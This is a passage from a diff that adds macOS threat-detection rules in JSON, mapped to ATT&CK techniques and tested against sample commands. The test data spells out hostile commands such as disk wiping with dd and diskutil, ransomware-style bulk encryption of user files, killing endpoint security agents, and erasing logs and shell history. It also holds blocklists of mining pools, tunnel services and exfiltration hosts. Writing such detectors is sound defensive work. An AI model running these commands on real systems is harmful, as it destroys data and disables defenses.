+    "pattern": "(minexmr|supportxmr|nanopool\\.org|moneroocean|2miners|f2pool|hashvault|c3pool|unmineable|crazypool|miningpoolhub|xmrpool|herominers)"
+   },
+   "tags": [
+    "macos",
+    "miner"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "destination": "pool.supportxmr.com:3333"
+     },
+     {
+      "destination": "xmr.2miners.com:2222"
+     }
+    ],
+    "negative": [
+     {
+      "destination": "example.com:443"
+     },
+     {
+      "destination": "github.com:22"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-openssl-bulk-encrypt-users",
+   "name": "openssl encrypting user files in a loop",
+   "description": "openssl enc applied via find/for over /Users documents.",
+   "tactic": "Impact",
+   "technique": "T1486",
+   "technique_name": "Data Encrypted for Impact",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "openssl enc"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(find\\s+\\S*/users/|for\\s+\\w+\\s+in\\s+\\S*(/users/|~/|\\$home))"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "-in\\b"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "ransomware"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c 'for f in /Users/ann/Documents/*; do openssl enc -aes-256-cbc -salt -in $f -out $f.enc -k k; done'"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/openssl",
+      "command": "openssl enc -d -aes-256-cbc -in a.enc -out a"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-gpg-bulk-encrypt-users",
+   "name": "gpg encrypting user files in bulk",
+   "description": "gpg or age encryption executed via find -exec or loops over user data.",
+   "tactic": "Impact",
+   "technique": "T1486",
+   "technique_name": "Data Encrypted for Impact",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(gpg|age)\\b[^|;]*(-e|--encrypt|-r\\s)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(find\\s+\\S*/users\\b[^;]*-exec|for\\s+\\w+\\s+in\\s+\\S*/users/)"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "ransomware"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/find",
+      "command": "find /Users -type f -name '*.pdf' -exec gpg --batch -e -r k {} ;"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/local/bin/gpg",
+      "command": "gpg --encrypt -r me file.txt"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-diskutil-erase",
+   "name": "Disk or volume erased from the shell",
+   "description": "diskutil erase/secureErase/zeroDisk/apfs deleteVolume.",
+   "tactic": "Impact",
+   "technique": "T1561.001",
+   "technique_name": "Disk Wipe: Disk Content Wipe",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/diskutil"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(erasedisk|erasevolume|secureerase|zerodisk|randomdisk|apfs\\s+deletevolume|apfs\\s+deletecontainer)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "wipe"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/sbin/diskutil",
+      "command": "diskutil eraseDisk APFS Blank disk2"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/diskutil",
+      "command": "diskutil list"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-dd-zero-disk",
+   "name": "dd writes onto a raw disk device",
+   "description": "dd with of=/dev/disk* overwrites device content.",
+   "tactic": "Impact",
+   "technique": "T1561.001",
+   "technique_name": "Disk Wipe: Disk Content Wipe",
+   "severity": "critical",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/dd"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "of=/dev/r?disk\\d"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "wipe"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/dd",
+      "command": "dd if=/dev/zero of=/dev/disk0 bs=1m"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/dd",
+      "command": "dd if=/dev/disk2 of=/tmp/img bs=1m"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-srm-rm-user-data-recursive",
+   "name": "Recursive deletion of whole user data directories",
+   "description": "srm -r or rm -rf targeting Documents, Desktop or a whole home.",
+   "tactic": "Impact",
+   "technique": "T1485",
+   "technique_name": "Data Destruction",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "\\b(srm\\s+-[a-z]*r[a-z]*|rm\\s+-[a-z]*r[a-z]*)\\s+(~|/users/[^/\\s]+|\\$home)/?(documents|desktop|pictures)?/?\\*?(\\s|$)"
+   },
+   "tags": [
+    "macos",
+    "destruction"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/rm",
+      "command": "rm -rf /Users/ann/Documents/"
+     },
+     {
+      "executable": "/usr/bin/srm",
+      "command": "srm -rf ~/Desktop"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/rm",
+      "command": "rm -rf /Users/ann/Documents/old-build/tmp"
+     },
+     {
+      "executable": "/bin/rm",
+      "command": "rm file.txt"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-tmutil-delete-or-disable",
+   "name": "Time Machine backups removed or disabled",
+   "description": "tmutil delete, deletelocalsnapshots, disable or removedestination.",
+   "tactic": "Impact",
+   "technique": "T1490",
+   "technique_name": "Inhibit System Recovery",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/tmutil"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(delete|deletelocalsnapshots|disable|removedestination|disablelocal)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "backup"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/tmutil",
+      "command": "tmutil deletelocalsnapshots 2026-01-01-120000"
+     },
+     {
+      "executable": "/usr/bin/tmutil",
+      "command": "tmutil disable"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/tmutil",
+      "command": "tmutil listlocalsnapshots /"
+     },
+     {
+      "executable": "/usr/bin/tmutil",
+      "command": "tmutil startbackup"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-fdesetup-enable-script",
+   "name": "FileVault enabled or recovery key changed from the shell",
+   "description": "fdesetup enable or changerecovery by script, which ransomware could use to lock the volume.",
+   "tactic": "Impact",
+   "technique": "T1486",
+   "technique_name": "Data Encrypted for Impact",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/fdesetup"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(enable|changerecovery|removerecovery)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "filevault"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/fdesetup",
+      "command": "fdesetup enable -inputplist"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/fdesetup",
+      "command": "fdesetup status"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-hdiutil-encrypted-image-of-home",
+   "name": "Encrypted disk image created from user data",
+   "description": "hdiutil create -encryption with a srcfolder under /Users.",
+   "tactic": "Collection",
+   "technique": "T1560",
+   "technique_name": "Archive Collected Data",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/hdiutil"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "create"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "-encryption"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "-srcfolder\\s+\\S*/users/"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "archive"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/hdiutil",
+      "command": "hdiutil create -encryption -srcfolder /Users/ann/Documents out.dmg"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/hdiutil",
+      "command": "hdiutil create -srcfolder /Users/ann/Documents out.dmg"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-archive-user-data-to-temp",
+   "name": "User data archived into temp",
+   "description": "zip/ditto/tar of Documents, Desktop or Library data into a temp location.",
+   "tactic": "Collection",
+   "technique": "T1560.001",
+   "technique_name": "Archive Collected Data: Archive via Utility",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(zip|ditto|tar)\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "/users/[^/\\s]+/(documents|desktop|library/(messages|safari|application support))|~/(documents|desktop)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s(/private)?/(tmp|var/tmp)/\\S+\\.(zip|tar|tgz|gz|7z)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "archive"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/zip",
+      "command": "zip -r /tmp/d.zip /Users/ann/Documents"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/tar",
+      "command": "tar czf backup.tgz /var/www"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-messages-db-access",
+   "name": "Messages database read",
+   "description": "sqlite3 on chat.db to extract iMessage history.",
+   "tactic": "Collection",
+   "technique": "T1005",
+   "technique_name": "Data from Local System",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/sqlite3"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "chat.db"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "messages"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/sqlite3",
+      "command": "sqlite3 ~/Library/Messages/chat.db 'select text from message'"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/sqlite3",
+      "command": "sqlite3 app.db"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-kill-security-tool",
+   "name": "Security tool process killed or unloaded",
+   "description": "killall/pkill/launchctl remove aimed at common endpoint security agents.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.001",
+   "technique_name": "Impair Defenses: Disable or Modify Tools",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(killall|pkill|launchctl\\s+(unload|remove|bootout))\\b"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       "falcon",
+       "sentinel",
+       "wdav",
+       "defender",
+       "jamf",
+       "carbonblack",
+       "littlesnitch",
+       "lulu",
+       "oversight",
+       "knockknock",
+       "blockblock",
+       "kavach"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "edr-evasion"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/pkill",
+      "command": "pkill -9 falcond"
+     },
+     {
+      "executable": "/bin/launchctl",
+      "command": "launchctl unload /Library/LaunchDaemons/com.microsoft.wdav.plist"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/pkill",
+      "command": "pkill -f Safari"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-security-tool-discovery",
+   "name": "Process list searched for security tools",
+   "description": "ps/pgrep/launchctl list grepped for endpoint or network security tool names.",
+   "tactic": "Discovery",
+   "technique": "T1518.001",
+   "technique_name": "Software Discovery: Security Software Discovery",
+   "severity": "low",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(ps|pgrep|launchctl\\s+list|systemextensionsctl\\s+list)\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\|\\s*grep\\s+(-i\\s+)?['\\\"]?[^|]*(little ?snitch|lulu|crowdstrike|falcon|sentinel|defender|oversight|knockknock|jamf)"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "discovery"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c 'ps aux | grep -i \"little snitch\\|lulu\\|falcon\"'"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c 'ps aux | grep python'"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-vm-sandbox-check-ioreg",
+   "name": "VM or sandbox detection via ioreg or sysctl",
+   "description": "ioreg/sysctl/system_profiler output filtered for hypervisor strings, typical of sandbox-evading malware.",
+   "tactic": "Defense Evasion",
+   "technique": "T1497.001",
+   "technique_name": "Virtualization/Sandbox Evasion: System Checks",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(ioreg|sysctl|system_profiler)\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "grep\\s+(-i\\s+)?['\\\"]?[^|]*(vmware|virtualbox|parallels|qemu|virtual machine)"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "evasion"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c 'ioreg -l | grep -i virtualbox'"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/ioreg",
+      "command": "ioreg -l"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-log-erase-or-delete",
+   "name": "System logs erased",
+   "description": "log erase or deletion of /var/log and unified logs.",
+   "tactic": "Defense Evasion",
+   "technique": "T1070.002",
+   "technique_name": "Indicator Removal: Clear Linux or Mac System Logs",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "suffix",
+        "pattern": "/log"
+       },
+       {
+        "field": "command",
+        "op": "contains",
+        "pattern": "erase"
+       },
+       {
+        "field": "command",
+        "op": "contains",
+        "pattern": "--all"
+       }
+      ]
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\brm\\b[^;|]*(/private)?/var/(log|db/diagnostics|db/uuidtext)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\brm\\b[^;|]*/library/logs/"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "logs"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/log",
+      "command": "log erase --all"
+     },
+     {
+      "executable": "/bin/rm",
+      "command": "rm -rf /private/var/log/asl"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/log",
+      "command": "log show --last 1h"
+     },
+     {
+      "executable": "/bin/rm",
+      "command": "rm /tmp/a.log"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-shell-history-cleared",
+   "name": "Shell history disabled or erased",
+   "description": "HISTFILE unset or history files removed or truncated.",
+   "tactic": "Defense Evasion",
+   "technique": "T1070.003",
+   "technique_name": "Indicator Removal: Clear Command History",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "unset\\s+histfile|histfile=/dev/null|\\brm\\b[^;|]*\\.(zsh|bash)_history|>\\s*~?/?[^ ]*\\.(zsh|bash)_history|history\\s+-c"
+   },
+   "tags": [
+    "macos",
+    "history"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/zsh",
+      "command": "zsh -c 'unset HISTFILE'"
+     },
+     {
+      "executable": "/bin/rm",
+      "command": "rm -f ~/.zsh_history"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/zsh",
+      "command": "zsh -c 'history'"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-timestomp-touch",
+   "name": "File timestamps rewritten",
+   "description": "touch -t/-r used to backdate files in staging or persistence paths.",
+   "tactic": "Defense Evasion",
+   "technique": "T1070.006",
+   "technique_name": "Indicator Removal: Timestomp",
+   "severity": "low",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/touch"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-[a-z]*[tr]\\s+\\S+\\s+\\S+"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(/tmp/|/var/tmp/|/users/shared/|launchagents|launchdaemons)"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "timestomp"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/touch",
+      "command": "touch -t 202001010000 /private/tmp/agent"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/touch",
+      "command": "touch /tmp/a"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-chflags-hidden",
+   "name": "Files hidden with chflags or SetFile",
+   "description": "chflags hidden or SetFile -a V on temp or LaunchAgent paths.",
+   "tactic": "Defense Evasion",
+   "technique": "T1564.001",
+   "technique_name": "Hide Artifacts: Hidden Files and Directories",
+   "severity": "low",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "any": [
+       {
+        "all": [
+         {
+          "field": "executable",
+          "op": "suffix",
+          "pattern": "/chflags"
+         },
+         {
+          "field": "command",
+          "op": "contains",
+          "pattern": "hidden"
+         }
+        ]
+       },
+       {
+        "all": [
+         {
+          "field": "executable",
+          "op": "suffix",
+          "pattern": "/setfile"
+         },
+         {
+          "field": "command",
+          "op": "regex",
+          "pattern": "-a\\s+\\S*v"
+         }
+        ]
+       }
+      ]
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(/tmp/|/var/tmp/|/users/shared/|launchagents|launchdaemons|/library/)"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "hiding"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/chflags",
+      "command": "chflags hidden /private/tmp/agent"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/chflags",
+      "command": "chflags hidden ~/Desktop/a"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-networksetup-proxy-set",
+   "name": "System proxy configured from shell",
+   "description": "networksetup sets a web, secure web or SOCKS proxy, enabling traffic interception.",
+   "tactic": "Command and Control",
+   "technique": "T1090",
+   "technique_name": "Proxy",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/networksetup"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "-set(web|secureweb|socksfirewall|autoproxy)proxy\\s"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "proxy"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/sbin/networksetup",
+      "command": "networksetup -setwebproxy Wi-Fi 10.0.0.5 8080"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/networksetup",
+      "command": "networksetup -getwebproxy Wi-Fi"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-dscacheutil-admin-enum",
+   "name": "Admin group enumeration",
+   "description": "dscacheutil or dscl listing members of admin groups.",
+   "tactic": "Discovery",
+   "technique": "T1069.001",
+   "technique_name": "Permission Groups Discovery: Local Groups",
+   "severity": "low",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "any": [
+       {
+        "field": "executable",
+        "op": "suffix",
+        "pattern": "/dscacheutil"
+       },
+       {
+        "field": "executable",
+        "op": "suffix",
+        "pattern": "/dscl"
+       }
+      ]
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(-q\\s+group\\s+-a\\s+name\\s+admin|/groups/admin\\b)"
+     },
+     {
+      "not": {
+       "field": "command",
+       "op": "contains",
+       "pattern": "-append"
+      }
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "discovery"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/dscacheutil",
+      "command": "dscacheutil -q group -a name admin"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/dscacheutil",
+      "command": "dscacheutil -flushcache"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-tunnel-service-destination",
+   "name": "Connection to a public tunneling service",
+   "description": "Outbound to ngrok, trycloudflare, serveo, localhost.run and similar reverse tunnel brokers.",
+   "tactic": "Command and Control",
+   "technique": "T1572",
+   "technique_name": "Protocol Tunneling",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "network",
+   "match": {
+    "field": "destination",
+    "op": "regex",
+    "pattern": "(ngrok\\.io|ngrok-free\\.(app|dev)|ngrok\\.app|trycloudflare\\.com|serveo\\.net|localhost\\.run|loca\\.lt|pagekite\\.me)(:\\d+)?$"
+   },
+   "tags": [
+    "macos",
+    "tunnel"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "destination": "abc.ngrok-free.app:443"
+     },
+     {
+      "destination": "x.trycloudflare.com:443"
+     }
+    ],
+    "negative": [
+     {
+      "destination": "example.com:443"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-exfil-sharing-service-destination",
+   "name": "Connection to an anonymous file-drop service",
+   "description": "Outbound to transfer.sh, file.io, anonfiles, temp.sh, gofile or similar drops often used to exfiltrate.",
+   "tactic": "Exfiltration",
+   "technique": "T1567.002",
+   "technique_name": "Exfiltration Over Web Service: Exfiltration to Cloud Storage",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "network",
+   "match": {
+    "field": "destination",
+    "op": "regex",
+    "pattern": "(transfer\\.sh|file\\.io|anonfiles|temp\\.sh|gofile\\.io|bashupload\\.com|0x0\\.st|catbox\\.moe)(:\\d+)?$"
+   },
+   "tags": [
+    "macos",
+    "exfil"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "destination": "transfer.sh:443"
+     },
+     {
+      "destination": "store1.gofile.io:443"
+     }
+    ],
+    "negative": [
+     {
+      "destination": "registry.npmjs.org:443"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-telegram-bot-api-destination",
+   "name": "Connection to the Telegram bot API",
+   "description": "Outbound to api.telegram.org, commonly abused by stealers for exfiltration or C2.",
+   "tactic": "Command and Control",
+   "technique": "T1102.002",
+   "technique_name": "Web Service: Bidirectional Communication",
+   "severity": "low",
+   "os": "any",
+   "event_type": "network",
+   "match": {
+    "field": "destination",
+    "op": "regex",
+    "pattern": "^api\\.telegram\\.org(:\\d+)?$"
+   },
+   "tags": [
+    "macos",
+    "telegram"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "destination": "api.telegram.org:443"
+     }
+    ],
+    "negative": [
+     {
+      "destination": "telegram.org:443"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-dyndns-destination",
+   "name": "Connection to a dynamic DNS domain",
+   "description": "Outbound to duckdns, no-ip, ddns.net and similar dynamic DNS hosts.",
+   "tactic": "Command and Control",
+   "technique": "T1568",
+   "technique_name": "Dynamic Resolution",
+   "severity": "low",
+   "os": "any",
+   "event_type": "network",
+   "match": {
+    "field": "destination",
+    "op": "regex",
+    "pattern": "(duckdns\\.org|no-ip\\.(com|org|biz)|ddns\\.net|hopto\\.org|zapto\\.org|servehttp\\.com)(:\\d+)?$"
+   },
+   "tags": [
+    "macos",
+    "ddns"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "destination": "c2.duckdns.org:443"
+     },
+     {
+      "destination": "host.ddns.net:8080"
+     }
+    ],
+    "negative": [
+     {
+      "destination": "example.com:443"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-default-handler-port",
+   "name": "Connection to default handler ports",
+   "description": "Outbound to port 4444, 1337 or 31337, defaults for common reverse-shell handlers.",
+   "tactic": "Command and Control",
+   "technique": "T1571",
+   "technique_name": "Non-Standard Port",
+   "severity": "low",
+   "os": "any",
+   "event_type": "network",
+   "match": {
+    "field": "destination",
+    "op": "regex",
+    "pattern": ":(4444|31337|1337)$"
+   },
+   "tags": [
+    "macos",
+    "port"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "destination": "10.0.0.5:4444"
+     },
+     {
+      "destination": "203.0.113.9:31337"
+     }
+    ],
+    "negative": [
+     {
+      "destination": "10.0.0.5:443"
+     },
+     {
+      "destination": "example.com:4443"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-cloud-metadata-endpoint",
+   "name": "Connection to the cloud instance metadata service",
+   "description": "Outbound to 169.254.169.254, a source of instance role credentials.",
+   "tactic": "Credential Access",
+   "technique": "T1552.005",
+   "technique_name": "Unsecured Credentials: Cloud Instance Metadata API",
+   "severity": "low",
+   "os": "any",
+   "event_type": "network",
+   "match": {
+    "field": "destination",
+    "op": "regex",
+    "pattern": "^169\\.254\\.169\\.254(:\\d+)?$"
+   },
+   "tags": [
+    "macos",
+    "cloud"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "destination": "169.254.169.254:80"
+     }
+    ],
+    "negative": [
+     {
+      "destination": "169.254.1.1:80"
+     }
+    ]
+   }
+  }
+ ]
+}
